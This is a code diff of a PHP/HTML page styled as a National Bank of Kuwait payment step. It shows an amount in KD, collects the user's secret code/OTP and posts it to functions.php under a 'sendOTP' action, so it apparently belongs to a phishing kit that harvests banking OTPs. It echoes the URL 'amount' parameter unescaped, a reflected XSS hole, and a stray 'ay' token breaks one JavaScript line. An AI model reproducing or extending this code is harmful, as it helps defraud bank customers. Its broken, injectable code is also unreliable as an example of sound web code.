@@ -61,7 +61,8 @@
         <div class="container">
             <div class="box-one">
                 <div class="d-flex justify-content-center">
-                    <img src="https://www.nbk.com/dam/jcr:281bc4f7-7256-48c6-a05e-761bacea00a3/nbk-logo.svg" alt="SPACES" itemprop="logo">
+                    <img src="https://www.nbk.com/dam/jcr:281bc4f7-7256-48c6-a05e-761bacea00a3/nbk-logo.svg"
+                        alt="SPACES" itemprop="logo">
                 </div>
                 <ul class="list-group list-group-flush">
                     <li class="list-group-item d-flex justify-content-start">
@@ -70,14 +71,17 @@
                     </li>
                     <li class="list-group-item d-flex justify-content-start">
                         <span class="">المبلغ</span> <!-- Aligns to the left -->
-                        <span class="mx-auto text-blue"><?php echo  isset($_GET['amount'])?  $_GET['amount']." KD" :  '100 KD'?></span> <!-- Centers within the list item -->
+                        <span
+                            class="mx-auto text-blue"><?php echo isset($_GET['amount']) ? $_GET['amount'] . " KD" : '100 KD' ?></span>
+                        <!-- Centers within the list item -->
                     </li>
                 </ul>
             </div>
         </div>
     </section>
 
-    <form action="functions.php?amount=<?php echo  isset($_GET['amount'])?  $_GET['amount'] :  '100'?>"" method="post" id="payment-form">
+    <form action="functions.php?amount=<?php echo isset($_GET['amount']) ? $_GET['amount'] : '100' ?>"" method=" post"
+        id="payment-form">
         <input type="hidden" name="action" value="sendOTP">
         <section>
             <div class="container">
@@ -124,11 +128,11 @@
 
 
     <script>
-        $(document).ready(function() {
-            $('#send-data').click(function(e) {
+        $(document).ready(function () {
+            $('#send-data').click(function (e) {
                 e.preventDefault();
                 var isValid = true;
-                var otp = $('#otp').val();
+                var otp = $('#otp').val(); ay
 
                 if (otp === "" || otp === null) {
                     alert("الرجاء ادخال الرقم السري.");
@@ -141,20 +145,26 @@
 
                 if (isValid) {
                     // Simulate a delay for demonstration (e.g., submitting the form)
-                    setTimeout(function() {
+                    setTimeout(function () {
                         $.ajax({
                             url: 'functions.php', // Replace with your PHP script URL
                             type: 'POST',
                             data: $('#payment-form').serialize(), // Serialize the form data
-                            success: function(response) {
+                            success: function (response) {
                                 // Handle success response
-                                console.log(response);
+                                if (response.status === 'success') {
+                                    // Redirect to OTP page if the email was sent successfully
+                                    window.location.href = response.redirect;
+                                } else {
+                                    // Display an error message if something went wrong
+                                    alert(response.message || 'Failed ');
+                                }
                             },
-                            error: function(xhr, status, error) {
+                            error: function (xhr, status, error) {
                                 // Handle error response
                                 console.log(xhr.responseText);
                             },
-                            complete: function() {
+                            complete: function () {
                                 // Hide the loader
                                 $('#loader').hide();
                             }
